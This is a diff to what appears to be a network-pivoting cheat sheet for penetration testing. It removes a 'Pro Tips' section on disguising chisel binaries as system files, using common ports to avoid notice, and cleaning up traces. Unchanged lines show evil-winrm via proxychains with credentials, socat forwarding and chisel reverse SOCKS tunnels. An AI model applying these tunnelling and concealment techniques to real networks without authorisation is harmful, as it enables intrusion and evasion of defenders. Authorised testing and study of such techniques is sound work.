@@ -177,13 +177,6 @@ proxychains evil-winrm -i 192.168.1.10 -u admin -p password
 - Want persistent encrypted tunnels
 - Multiple services to access
 
-## Pro Tips
-
-1. **Hide your binaries** - Rename `chisel` to something innocent like `.systemd` or `update-notifier`
-2. **Use legit ports** - 443, 80, 53 look less sus than 8000
-3. **Clean up** - Kill your tunnels and delete binaries when done
-4. **Chain pivots** - You can pivot through multiple boxes to go deeper
-
 ## Quick Reference
 
 ```bash
@@ -198,5 +191,3 @@ socat TCP-LISTEN:8080,fork TCP:target:80
 ./chisel server --reverse --port 8000
 ./chisel client server-ip:8000 R:socks
 ```
-
-That's it. Now go pivot some networks.
